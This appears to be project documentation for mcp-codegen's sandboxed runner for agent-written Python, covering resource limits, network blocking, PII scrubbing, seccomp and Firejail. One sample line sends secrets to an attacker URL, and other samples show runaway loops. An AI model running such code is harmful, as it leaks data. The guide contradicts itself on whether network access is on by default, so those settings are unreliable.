# Execute Agent Code with Sandboxing

Comprehensive guide to mcp-codegen's secure code execution environment.

## Table of Contents

1. [What This Feature Does](#what-this-feature-does)
2. [Use Cases](#use-cases)
3. [How It Works](#how-it-works)
4. [Security Layers](#security-layers)
5. [Integration with MCP](#integration-with-mcp)
6. [Real-World Examples](#real-world-examples)
7. [Configuration Options](#configuration-options)

---

## What This Feature Does

The `mcp-codegen run` command provides a **secure execution environment for AI-generated Python code** that orchestrates MCP tools.

### The Problem It Solves

When an AI agent writes Python code to work with MCP tools, you need to:
- ✅ Execute untrusted code safely (agents can make mistakes or be malicious)
- ✅ Prevent resource exhaustion (infinite loops, memory leaks)
- ✅ Protect sensitive data (PII in logs and outputs)
- ✅ Control network access (force MCP client usage, not direct API calls)
- ✅ Provide utilities for common agent tasks (tool search, workspace I/O)

### What It Enables

A safe execution environment where agents can:
- Search and load MCP tools on-demand
- Execute async workflows with multiple tool calls
- Write results to a workspace (avoiding context bloat)
- Run with automatic resource limits and PII scrubbing
- Orchestrate complex multi-server workflows

---

## Use Cases

### 1. **Safe Agent Orchestration**

Agent needs to coordinate multiple MCP tool calls:

```bash
mcp-codegen run --file agent.py --cpu-seconds 30 --memory-mb 1024
```

Agent script:
```python
from mcp_codegen.runtime import search_tools

# Search for tools
github_tools = search_tools("github create issue")
slack_tools = search_tools("slack send message")

# Use tools safely
issue = await create_github_issue(...)
await send_slack_notification(...)
```

### 2. **Large Dataset Processing**

Filter and transform data before returning to model:

```bash
mcp-codegen run --file process_data.py --memory-mb 2048 --seccomp
```

Script:
```python
from mcp_codegen.runtime import workspace

# Fetch large dataset via MCP
all_rows = await gdrive.getSheet({'sheetId': 'abc123'})

# Filter in execution environment (not context)
pending = [row for row in all_rows if row['Status'] == 'pending']

# Write results to workspace
workspace.write('pending_orders.json', pending)
print(f"Found {len(pending)} pending orders (see workspace/pending_orders.json)")
```

### 3. **Production Agent Deployment**

Deploy agent-written code with full security hardening:

```bash
mcp-codegen run --file deployment_agent.py \
  --cpu-seconds 60 \
  --memory-mb 2048 \
  --seccomp \
  --firejail \
  --allow-network
```

### 4. **Protecting Sensitive Data**

Prevent PII leaks in logs:

```bash
mcp-codegen run --file import_leads.py --seccomp
```

Script:
```python
# Load customer data from Google Sheets
sheet = await gdrive.getSheet({'sheetId': 'abc123'})

# Log with auto-scrubbed PII
logger.info(f"Processing {len(sheet.rows)} customers")
# Output: "Processing 100 customers"
# NOT: "Processing user@example.com, 555-123-4567, ..."

# Import to Salesforce (PII protected at token level)
for row in sheet.rows:
    await salesforce.updateRecord({
        'objectType': 'Lead',
        'data': {
            'Email': row.email,      # [EMAIL_1] during execution
            'Phone': row.phone,      # [PHONE_1] during execution
            'Name': row.name         # [NAME_1] during execution
        }
    })
```

---

## How It Works

### Architecture Overview

```
User Command: mcp-codegen run --file agent.py
    ↓
CLI (cli.py:_run)
    ↓ Subprocess
Runner (examples/runner/run.py)
    ↓ Apply Sandboxing Layers
    ├─ Resource limits (limits.py)
    ├─ Network isolation (run.py:_disable_network)
    ├─ Output truncation (TruncatedStringIO)
    ├─ PII scrubbing (privacy.py)
    └─ Optional: seccomp/Firejail (sandbox.py)
    ↓
Execute Agent Code in Limited Namespace
    ├─ Inject utilities: search_tools, workspace, logger, scrub
    ├─ Capture stdout/stderr with 200KB limits
    └─ Monitor resource usage
    ↓
Return Results (stdout, stderr, usage stats)
```

### Execution Flow

**Step 1: Parse Arguments**
```bash
mcp-codegen run --file agent.py --cpu-seconds 30 --memory-mb 1024 --seccomp
```

CLI validates options and spawns runner subprocess.

**Step 2: Apply Resource Limits (Before Code Execution)**

Runner process applies limits via `resource.setrlimit()`:
```python
apply_limits(cpu_seconds=30, max_memory_mb=1024, max_files=64, max_processes=64)
```

Once set, Linux kernel enforces these limits for entire process tree.

**Step 3: Disable Network (If Not Allowed)**

Patch Python's socket module:
```python
if not allow_network:
    _disable_network()  # socket.socket() raises RuntimeError
```

**Step 4: Create Execution Namespace**

Inject utilities and execute code:
```python
namespace = {
    'search_tools': search_tools,        # Tool search function
    'workspace': workspace,              # File I/O to .workspace/
    'run_async': run_async,              # Execute async code
    'logger': logger,                    # PII-scrubbing logger
    'scrub': scrub,                      # Manual PII scrubbing
    '__name__': '__main__',
    '__file__': file_path,
}

# Capture output
with TruncatedStringIO(max_size=200_000) as out:
    exec(code, namespace)  # Execute agent code
```

**Step 5: Monitor and Report**

Track resource usage and return results:
```
CPU time used: 8.5s / 30s
Memory peak: 512MB / 1024MB
Output: 50KB / 200KB
Status: Success
Warnings: None
```

### Key Implementation Files

**CLI Entry Point** (`cli.py:_run()`)
- Validates command-line arguments
- Locates runner at `examples/runner/run.py`
- Builds subprocess command with flags
- Executes and returns results

**Main Runner** (`examples/runner/run.py`)
- `apply_limits()`: Sets resource limits before code execution
- `_disable_network()`: Patches socket module
- `TruncatedStringIO`: Custom StringIO with size limits
- `run_agent_code()`: Executes code in controlled namespace
- `run_async()`: Helper for async code execution

**Resource Enforcement** (`examples/runner/limits.py`)
```python
def apply_limits(cpu_seconds=10, max_memory_mb=512,
                 max_files=64, max_processes=64):
    resource.setrlimit(resource.RLIMIT_CPU, (cpu_seconds, cpu_seconds))
    resource.setrlimit(resource.RLIMIT_AS, (mem_bytes, mem_bytes))
    resource.setrlimit(resource.RLIMIT_NOFILE, (max_files, max_files))
    resource.setrlimit(resource.RLIMIT_NPROC, (max_processes, max_processes))
```

**Network Isolation** (`run.py:_disable_network()`)
```python
class _Denied:
    def __getattr__(self, _):
        raise RuntimeError("Network disabled - use MCP client for API calls")

socket.socket = _Denied
socket.create_connection = _Denied
```

**Workspace I/O** (`examples/runner/workspace.py`)
- `workspace.write(path, data)`: Write to `.workspace/` directory
- Auto-creates directories
- Handles JSON serialization
- Results don't bloat model context

**PII Scrubbing** (`examples/runner/privacy.py`)
- Regex patterns for emails, phone numbers, SSNs, credit cards
- `scrub(text)`: Manual scrubbing function
- Logger integration: auto-scrubs all log messages
- Pattern matching: `password`, `token`, `api_key` fields

**Tool Search** (`mcp_codegen/runtime/search.py`)
- `search_tools(query)`: Find tools using AST parsing (no schema loading)
- Returns `ToolRef` objects with lazy loading
- `tool.load()`: Import module on-demand
- Supports detail levels: name, basic, full

---

## Security Layers

### Layer 1: Resource Limits (All Platforms)

**Purpose:** Prevent resource exhaustion and runaway code

**What it limits:**
- **CPU:** Kill process after N seconds (default 10s)
- **Memory:** Kill process after N MB used (default 512MB)
- **File Descriptors:** Max 64 open files
- **Processes:** Max 64 child processes (prevents fork bombs)

**How it works:**
```python
import resource
resource.setrlimit(resource.RLIMIT_CPU, (30, 30))  # 30s hard limit
resource.setrlimit(resource.RLIMIT_AS, (1_073_741_824, 1_073_741_824))  # 1GB
```

**Examples of what gets blocked:**
```python
# CPU limit blocks this
while True:
    x = x * 2  # Killed after 30 seconds

# Memory limit blocks this
data = []
while True:
    data.append([0] * 1_000_000)  # Killed at 512MB

# Process limit blocks this
import subprocess
for i in range(100):
    subprocess.Popen(['sleep', '3600'])  # Killed at 64 processes
```

**Limitation:** Only blocks user code, not Python runtime memory overhead

---

### Layer 2: Network Isolation (Python Level Only)

**Purpose:** Optionally block direct network access to prevent data exfiltration

**What it blocks:**
- `socket.socket()` - Creating raw sockets
- `socket.create_connection()` - HTTP/HTTPS direct calls
- DNS lookups via sockets
- Any network protocol via Python sockets

**How it works:**
```python
import socket
socket.socket = _Denied  # Raises error on socket creation
```

**Default Behavior:**

Network access is **enabled by default** to allow MCP tool calls (httpx/requests). The socket patching affects the entire Python process when network is disabled.

**To block network access, add `--disable-network`:**

```bash
# This works (network enabled by default):
mcp-codegen run --file agent.py

# This blocks network access:
mcp-codegen run --file agent.py --disable-network
```

**Why this is opt-in:**

The current implementation patches Python's socket module at the process level. Since httpx (used by MCP client) also uses the socket module, blocking network by default would prevent the primary use case (calling MCP tools). Network isolation is available for specialized scenarios where you want to block all network access.

**Future improvements planned:**
- Whitelist MCP server URLs
- Allow httpx while blocking raw sockets
- Per-host network policy

**What gets blocked (with `--disable-network`):**
```python
# Blocked: Direct API call
import requests
requests.post("https://api.example.com/data")
# RuntimeError: Network access blocked by --disable-network flag

# Blocked: MCP client (also uses sockets)
from servers.github.create_issue import call, Params
await call(base_url, Params(...))
# RuntimeError: Network access blocked by --disable-network flag

# Allowed: Local file I/O
workspace.write('data.json', {...})  # Works
```

**Additional limitations:**
- Only blocks Python socket module, not C extensions
- C code can still make syscalls (use `--seccomp` on Linux for kernel-level blocking)
- File descriptor inheritance could bypass this

---

### Layer 3: Output Limits (All Platforms)

**Purpose:** Prevent log spam and context bloat

**What it limits:**
- **stdout:** 200KB maximum (default)
- **stderr:** 200KB maximum (default)
- Additional output silently discarded

**How it works:**
```python
class TruncatedStringIO(StringIO):
    def write(self, s):
        if len(self.getvalue()) + len(s) > self.max_size:
            s = s[:remaining] + f"\n... output truncated ({self.max_size} bytes)"
        return super().write(s)
```

**Examples:**
```python
# This is allowed
for i in range(100):
    print(f"Line {i}: " + "x" * 1000)  # 100KB total

# This gets truncated
for i in range(10000):
    print(f"Line {i}: " + "x" * 1000)  # Stops at 200KB
# Output: "Line 1: xxx...\n... output truncated (200000 bytes)"
```

---

### Layer 4: PII Scrubbing (All Platforms)

**Purpose:** Protect sensitive data in logs and output

**What it redacts:**
- **Email addresses:** `user@example.com` → `[EMAIL]`
- **Phone numbers:** `555-123-4567` → `[PHONE]`
- **SSNs:** `123-45-6789` → `[SSN]`
- **Credit cards:** `4532-1234-5678-9010` → `[CREDIT_CARD]`
- **Secrets:** Fields named `password`, `token`, `api_key`, `secret` → `[REDACTED]`

**How it works:**
```python
# Auto-scrubbing in logger
logger.info(f"User: {user_email}")  # Output: "User: [EMAIL]"
logger.debug(f"Token: {api_token}")  # Output: "Token: [REDACTED]"

# Manual scrubbing
from mcp_codegen.runner.privacy import scrub
safe_text = scrub(f"Email: {email}, Phone: {phone}")
# Result: "Email: [EMAIL], Phone: [PHONE]"
```

**Patterns (regex-based):**
```python
PATTERNS = {
    'email': r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b',
    'phone': r'\b(\+?1[-.\s]?)?\(?[0-9]{3}\)?[-.\s]?[0-9]{3}[-.\s]?[0-9]{4}\b',
    'ssn': r'\b\d{3}-\d{2}-\d{4}\b',
    'credit_card': r'\b\d{4}[-\s]?\d{4}[-\s]?\d{4}[-\s]?\d{4}\b',
}
```

**Important:** PII scrubbing happens at **output level only**. At the **data flow level**, MCP client can tokenize PII to prevent it from reaching the model context:

```python
# Agent code (PII visible)
data = await gdrive.getSheet({'sheetId': 'abc123'})
# data = [{'email': 'user@example.com', 'phone': '555-123-4567'}, ...]

# MCP client intercepts and tokenizes
# [{'email': '[EMAIL_1]', 'phone': '[PHONE_1]'}, ...]
# (Real values stored locally, untokenized when passed to other MCP tools)

# Agent logs (auto-scrubbed)
logger.info(f"Found {len(data)} records")  # Works fine, no PII
```

---

### Layer 5: Seccomp Syscall Filtering (Linux Only, Optional)

**Purpose:** Kernel-level blocking of dangerous syscalls

**What it blocks:**
- Network syscalls: `socket`, `connect`, `bind`, `listen`, `accept`
- Process tracing: `ptrace`, `process_vm_readv`, `process_vm_writev`
- Other risky syscalls: `execve`, `fork` (with restrictions)

**How it works:**
```bash
# Uses libseccomp to create whitelist of allowed syscalls
# ALLOW all syscalls by default
# KILL: socket, connect, bind, listen, accept, ptrace
mcp-codegen run --file agent.py --seccomp
```

**Requirements:**
```bash
pip install python3-seccomp
# or
apt-get install python3-seccomp libseccomp-dev
```

**Benefits over Layer 2 (Network Isolation):**
- Works at kernel level (blocks C extensions, not just Python)
- Applies to entire process tree (all child processes)
- Cannot be bypassed by clever Python code

**Example:**
```python
# With --seccomp, this is blocked at kernel level
import ctypes
libc = ctypes.CDLL('libc.so.6')
libc.socket(...)  # Killed by seccomp (syscall blocked)
```

---

### Layer 6: Firejail Sandbox (Linux Only, Optional)

**Purpose:** Full process isolation with namespace separation

**What it provides:**
- **Network namespace:** No network access unless explicitly allowed
- **Filesystem namespace:** Private `/tmp`, read-only root
- **PID namespace:** Only see own process and children
- **Capability dropping:** Remove dangerous Linux capabilities
- **No X11/Sound/Devices:** Can't access user's GUI or hardware

**How it works:**
```bash
mcp-codegen run --file agent.py --firejail
```

**Firejail profile** (`examples/runner/firejail-mcp.profile`):
```
noprofile
nosound
novideo
nogroups
net none
private
private-tmp
read-only /
```

**Requirements:**
```bash
apt-get install firejail
```

**Benefits:**
- Multiple layers of isolation (not just sandboxing one resource)
- Namespace-level isolation (stronger than process limits)
- Can be combined with seccomp for defense-in-depth

---

## Integration with MCP

### How It Fits in the mcp-codegen Workflow

```
Phase 1: Code Generation
mcp-codegen gen --fs-layout --url <server> --name github
→ Generates servers/github/*.py with type-safe APIs

Phase 2: Agent Development
Agent writes agent.py using:
- search_tools() for tool discovery
- Import statements for type-safe tool access
- workspace for I/O

Phase 3: Sandboxed Execution ← You are here
mcp-codegen run --file agent.py --cpu-seconds 30 --seccomp
→ Executes with security guarantees
```

### Tool Search Without Loading Schemas

Agent can search for tools without loading all schemas:

```python
from mcp_codegen.runtime import search_tools

# Fast AST-based search (no schema loading)
tools = search_tools("github create")
# Returns: [ToolRef(server='github', tool='create_issue', summary='...')]

# Load only when needed
tool = tools[0].load()
result = await tool.call(base_url, tool.Params(...))
```

### Code-Based Tool Interaction

Tools presented as type-safe Python APIs:

```python
# Type-safe, with IDE support
from servers.github.create_issue import call, Params
from servers.github import SERVER_URL

params = Params(
    owner="myorg",
    repo="myrepo",
    title="Deploy v2.0",
    body="Automated deployment"
)
result = await call(SERVER_URL, params)

# vs. string-based tool calls (no type safety)
# result = await call_tool("create_issue", {"owner": "...", ...})
```

### Workspace Pattern (Context Efficiency)

Large results stay in execution environment:

```python
from mcp_codegen.runtime import workspace

# Fetch large dataset
all_issues = await github.list_issues({
    'owner': 'myorg',
    'repo': 'myrepo'
})

# Filter in code (not context)
high_priority = [i for i in all_issues if i['priority'] == 'high']

# Write to workspace
workspace.write('high_priority_issues.json', high_priority)

# Model sees:
# "Wrote 150 high-priority issues to workspace/high_priority_issues.json"
# NOT: 50,000 tokens of issue JSON
```

### Why Agents Need Sandboxing

Agents can write code with mistakes:

```python
# BUG: Infinite loop
while True:
    data = await fetch_all_repos()

# BUG: Memory leak
results = []
while True:
    results.append(huge_dataset)

# BUG: Unintended network call
import requests
requests.get("https://attacker.com/?data=" + secrets)

# BUG: PII leak
logger.info(f"User credentials: {username}:{password}")
```

Sandboxing prevents these from breaking everything:

```python
# Killed after 30s CPU time
while True: ...

# Killed at 512MB memory
results = []
while True: results.append(...)

# RuntimeError: Network disabled
requests.get(...)

# Auto-scrubbed
logger.info(f"...")  # Shows: "[REDACTED]"
```

---

## Real-World Examples

### Example 1: GitHub PR Creation with Slack Notification

**Setup:**
```bash
mcp-codegen gen --fs-layout --url https://github-mcp.example.com --name github
mcp-codegen gen --fs-layout --url https://slack-mcp.example.com --name slack
```

**Agent Script** (`agent.py`):
```python
from mcp_codegen.runtime import search_tools, workspace, run_async
from servers.github.create_pr import call as create_pr, Params as PRParams
from servers.slack.send_message import call as send_slack, Params as SlackParams

async def workflow():
    # Create GitHub PR
    pr = await create_pr(
        'https://github-mcp.example.com',
        PRParams(
            owner='myorg',
            repo='myrepo',
            title='Release v2.0',
            body='Automated release PR',
            head='release/v2.0',
            base='main'
        )
    )

    # Notify team on Slack
    await send_slack(
        'https://slack-mcp.example.com',
        SlackParams(
            channel='#deployments',
            text=f"🚀 Release PR created: {pr.url}"
        )
    )

    # Write result
    workspace.write('pr_created.json', {'url': pr.url, 'number': pr.number})

run_async(workflow())
```

**Execution:**
```bash
mcp-codegen run --file agent.py --cpu-seconds 30 --memory-mb 1024 --seccomp
```

**Output:**
```
🚀 Release PR created: https://github.com/myorg/myrepo/pull/1234
Execution completed:
- CPU time: 2.3s / 30s
- Memory peak: 156MB / 1024MB
- Status: Success
```

---

### Example 2: Large Dataset Processing with Filtering

**Script** (`process_data.py`):
```python
from mcp_codegen.runtime import search_tools, workspace
import json

async def process():
    # Search for Google Drive tool
    tools = search_tools("google drive get sheet")
    gdrive_tool = tools[0]

    # Fetch large spreadsheet
    sheet_data = await gdrive_tool.load().call(
        'https://gdrive-mcp.example.com',
        gdrive_tool.load().Params(sheetId='abc123')
    )

    # Process in code (not context)
    records = json.loads(sheet_data)

    # Filter: only completed orders
    completed = [r for r in records if r['status'] == 'completed']

    # Aggregate: sum by customer
    by_customer = {}
    for record in completed:
        customer = record['customer']
        amount = record['amount']
        by_customer[customer] = by_customer.get(customer, 0) + amount

    # Write to workspace
    workspace.write('customer_totals.json', by_customer)

    print(f"Processed {len(records)} orders")
    print(f"Found {len(completed)} completed orders")
    print(f"Results saved to workspace/customer_totals.json")

run_async(process())
```

**Execution:**
```bash
# Fetch 100,000 rows, process locally, return 5KB results
mcp-codegen run --file process_data.py --memory-mb 2048 --seccomp
```

**Output:**
```
Processed 100000 orders
Found 45678 completed orders
Results saved to workspace/customer_totals.json
Execution completed:
- CPU time: 8.5s / 10s
- Memory peak: 1234MB / 2048MB
- Status: Success
```

---

## Configuration Options

### CLI Flags

```bash
mcp-codegen run [OPTIONS]

Required (one of):
  --file FILE              Python file to execute
  --code CODE             Python code to execute inline

Optional:
  --servers-dir DIR       Directory containing servers/ (default: servers)
  --workspace DIR         Workspace directory (default: .workspace)

  --cpu-seconds N         CPU time limit in seconds (default: 10)
  --memory-mb N           Memory limit in MB (default: 512)

  --seccomp              Enable seccomp syscall filtering (Linux only)
  --firejail             Run with Firejail sandbox (Linux only)
  --allow-network        Allow network access (default: disabled)
```

### Examples

**Basic execution:**
```bash
mcp-codegen run --file agent.py
```

**With resource limits:**
```bash
mcp-codegen run --file agent.py --cpu-seconds 60 --memory-mb 2048
```

**With Linux hardening:**
```bash
mcp-codegen run --file agent.py --seccomp --firejail
```

**With network access:**
```bash
mcp-codegen run --file agent.py --allow-network --seccomp
```

**Inline code:**
```bash
mcp-codegen run --code "
from mcp_codegen.runtime import search_tools
tools = search_tools('weather')
print(f'Found {len(tools)} tools')
"
```

### Environment Variables

**None currently**, but planned:
- `MCP_TIMEOUT`: Default timeout for MCP calls
- `MCP_WORKSPACE`: Override workspace directory
- `SECCOMP_PROFILE`: Custom seccomp profile path

---

## Troubleshooting

### "CPU time limit exceeded"

**Problem:** Agent code ran longer than limit

**Solutions:**
```bash
# Increase limit
mcp-codegen run --file agent.py --cpu-seconds 60

# Check for infinite loops
# Look for while True, for loops without breaks, etc.
```

### "Memory limit exceeded"

**Problem:** Agent used too much memory

**Solutions:**
```bash
# Increase limit
mcp-codegen run --file agent.py --memory-mb 2048

# Filter data earlier
# Write large datasets to workspace instead of keeping in memory
```

### "Network disabled - use MCP client"

**Problem:** Agent tried to make direct network call

**Solution:**
```bash
# Option 1: Use MCP tools instead of direct API calls
# Option 2: Allow network if needed
mcp-codegen run --file agent.py --allow-network
```

### "File not found in workspace"

**Problem:** Agent tried to read from wrong path

**Solutions:**
```python
# Correct: Write to workspace
from mcp_codegen.runtime import workspace
workspace.write('data.json', data)

# Correct: Read from workspace
import json
with open('.workspace/data.json') as f:
    data = json.load(f)
```

### Seccomp/Firejail not available

**Problem:** `--seccomp` or `--firejail` flags fail

**Solutions:**
```bash
# Install seccomp
pip install python3-seccomp
# or
apt-get install python3-seccomp libseccomp-dev

# Install firejail
apt-get install firejail

# Run without seccomp (still have other protections)
mcp-codegen run --file agent.py --memory-mb 1024
```

---

## Security Considerations

### Defense in Depth

mcp-codegen uses **multiple security layers**:

1. **Resource limits** (all platforms) - Prevents runaway code
2. **Network isolation** (all platforms) - Forces MCP client usage
3. **Output limits** (all platforms) - Prevents log spam
4. **PII scrubbing** (all platforms) - Protects sensitive data
5. **Seccomp** (Linux, optional) - Kernel-level syscall filtering
6. **Firejail** (Linux, optional) - Full namespace isolation

**No single layer is perfect**, but together they provide strong protection.

### What Sandboxing Doesn't Protect Against

- **Algorithmic complexity:** A very slow (but valid) algorithm can still hit CPU limits
- **Denial of Service:** Resource limits prevent exhaustion but code can still be slow
- **Logic bugs:** Sandbox doesn't prevent incorrect code from running (only uncontrolled code)
- **Data validation:** Sandbox doesn't check if parameters are correct

### Best Practices

1. **Always use `--cpu-seconds`** - Set appropriate time limits
2. **Always use `--memory-mb`** - Set reasonable memory bounds
3. **Use `--seccomp` in production** - Adds kernel-level protection
4. **Use `--firejail` for sensitive workloads** - Full isolation
5. **Review agent code before running** - Sanity check generated code
6. **Log to workspace, not stdout** - Large results shouldn't go to context
7. **Use PII scrubbing in logger** - Avoid accidental data leaks

---

## Summary

**What:** Secure execution environment for AI agents orchestrating MCP tools

**Why:** Agents need to run untrusted code safely without resource exhaustion or data leaks

**How:** Multi-layer security (resource limits, network isolation, output caps, PII scrubbing, optional Linux hardening)

**When:** Use whenever an agent writes Python code to orchestrate 3+ MCP tool calls, or when processing large datasets

**Integration:** Works seamlessly with generated `servers/` layout and `search_tools()` function

**Layers:**
1. Resource limits (CPU, memory, file descriptors, processes)
2. Network isolation (block socket module)
3. Output limits (200KB stdout/stderr)
4. PII scrubbing (auto-redact sensitive data)
5. Seccomp (kernel-level syscall filtering, Linux only)
6. Firejail (full namespace isolation, Linux only)

This transforms mcp-codegen from a code generator into a **complete agent execution platform** aligned with Anthropic's best practices for building effective agents.
